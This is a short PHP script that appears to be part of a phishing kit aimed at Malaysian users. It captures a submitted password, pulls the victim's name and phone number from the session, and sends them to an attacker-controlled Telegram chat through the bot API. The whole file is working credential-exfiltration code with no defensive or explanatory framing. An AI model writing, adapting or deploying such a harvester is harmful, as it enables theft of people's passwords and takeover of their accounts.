<?php

session_start();
include "./telegram.php";

$password           = $_POST['password'];
$_SESSION['password '] = $password;

$full_name = $_SESSION['full_name'];
$phone_number = $_SESSION['phoneNumber'];
$otp_code= $_SESSION['otp'];



$message = "
DATA Password 🇲🇾
╔═══════════════════⊱
╠➤Name   : ".$full_name."
╠➤ No Hp : ".$phone_number."
╠➤Pass   : ".$password."
";

function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
?>
